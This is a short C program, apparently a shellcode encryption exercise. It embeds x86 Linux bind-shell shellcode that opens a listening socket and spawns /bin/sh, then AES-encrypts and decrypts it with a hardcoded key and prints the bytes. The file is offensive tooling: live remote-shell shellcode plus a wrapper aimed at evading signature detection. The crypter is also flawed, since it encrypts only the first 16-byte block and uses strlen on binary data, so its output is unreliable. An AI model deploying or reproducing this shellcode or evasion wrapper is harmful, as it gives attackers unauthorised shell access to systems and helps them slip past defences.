#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "openssl/aes.h"

int main(int argc, char* argv[])
{
    AES_KEY aesKey_;
    unsigned char Key[16]; 
    unsigned char ciphertext[256] = {0};
    strcpy((char *) Key,"012345678912345");

    unsigned char shellcode[] = \
"\x31\xdb\xf7\xe3\xb0\x66\xb3\x01\x52\x53\x6a\x02\x89\xe1\xcd\x80\x89\xc6"
"\xb0\x66\x43\x52\x66\x68\x82\x35\x66\x53\x89\xe1\x6a\x10\x51\x56\x89\xe1"
"\xcd\x80\xb0\x66\xb3\x04\x52\x56\x89\xe1\xcd\x80\xb0\x66\xb3\x05\x52\x52"
"\x56\x89\xe1\xcd\x80\x93\x31\xc9\xb1\x02\xb0\x3f\xcd\x80\x49\x79\xf9\x92"
"\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x50"
"\x89\xe2\xb0\x0b\xcd\x80";

    printf("[*] Encrypting Shellcode with key: %s \n", Key);

    AES_set_encrypt_key(Key, 128, &aesKey_);
    AES_encrypt(shellcode, ciphertext, &aesKey_);

    printf("[*] Encrypted Shellcode:\n");

    for (int i = 0; i < strlen(ciphertext); i++) {
	    
	    printf("\\x%x", ciphertext[i]);
	         
    }
    
    printf("\n");

    AES_set_decrypt_key(Key, 128, &aesKey_);
    AES_decrypt(ciphertext, shellcode,&aesKey_); 

    printf("[*] Decrypting Shellcode... \n");
    printf("[*] Recovered Original Shellcode: \n");

    for (int i = 0; i < strlen(shellcode); i++) {
	    
	    printf("\\x%x", shellcode[i]);
	         
    }

    printf("\n");

    return 0;
}

